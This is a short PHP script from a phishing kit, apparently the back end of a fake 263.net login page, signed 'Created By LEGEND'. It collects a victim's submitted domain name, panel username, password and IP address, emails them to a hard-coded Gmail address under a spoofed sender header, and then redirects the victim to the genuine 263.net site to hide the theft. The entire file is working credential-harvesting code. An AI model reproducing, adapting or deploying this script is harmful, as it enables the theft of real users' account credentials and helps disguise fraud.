<?

$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Created By LEGEND-------------------------\n";
$message .= " \n";
$message .= "Domain name: ".$_POST['userid']."\n";
$message .= "Panel username: ".$_POST['pass']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= " \n";
$message .= "IP: ".$ip."\n";
$message .= " \n";
$message .= "---------------Created By LEGEND-------------------------\n";
$recipient = "tngilroy1@gmail.com";
$subject = "Result from 263.net";
$headers = "From: 263.net<rezultz@Suntrust.pot>";
$headers .= $_POST['eMailAdd']."\n";
if (mail($recipient,$subject,$message, $headers))
{
header("Location: https://www.263.net/");
}
?>
